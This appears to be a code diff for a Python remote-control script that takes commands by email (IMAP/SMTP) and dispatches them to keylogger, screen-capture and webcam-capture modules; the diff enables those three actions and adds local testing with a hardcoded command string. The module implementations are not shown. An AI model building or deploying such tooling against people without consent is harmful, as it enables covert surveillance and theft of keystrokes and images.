@@ -1,8 +1,10 @@
 # Work with Image
+import service.key_logger as kl
 import service.capture_screen as cs
 import service.capture_webcam as cw
 import service.mac_address as mac
 import service.app_process as ap
+from PIL import Image
 import os
 import imaplib
 import smtplib
@@ -126,9 +128,9 @@ def parse_msg(msg):
 def action1():
     pass
 action_map = {
-    "Key logger": action1,
-    # "Capture Screen": cs.capture_screen,
-    # "Capture Webcam": cw.capture_webcam_image,
+    "Key logger": kl.key_logger,
+    "Capture Screen": cs.capture_screen,
+    "Capture Webcam": cw.capture_webcam_image,
     # "MAC address": mac.mac_address,
     # "Directory tree": action1,
     # "Shutdown/Logout": sl.shutdown_logout,
@@ -138,20 +140,36 @@ action_map = {
 def function(msg):
     options = parse_msg(msg)
     for func in options:
+        print(func)
         if (len(func) == 1):
-            action_map[func[0]]()
+            result = action_map[func[0]]()
         else: 
-            action_map[func[0]](func[1])
+            result = action_map[func[0]](func[1])
+
+        if isinstance(result, str):
+        # plaintext result
+            print(result)
+        elif isinstance(result, Image.Image):
+        # image result
+            result.show()
+    
+
+
 
 
 if __name__ == "__main__":
-    create_asset_folder()
+    # create_asset_folder()
 
-    msg = "SCREEN"
+    # msg = "SCREEN"
 
-    imap, smtp = connect()
-    receive_mail(imap, smtp)
+    # imap, smtp = connect()
+    # receive_mail(imap, smtp)
 
-    # logout and close mailbox #useless
-    imap.logout()
-    smtp.quit()
+    # # logout and close mailbox #useless
+    # imap.logout()
+    # smtp.quit()
+
+    msg = '''Key logger
+Capture Screen
+Capture Webcam'''
+    function(msg)
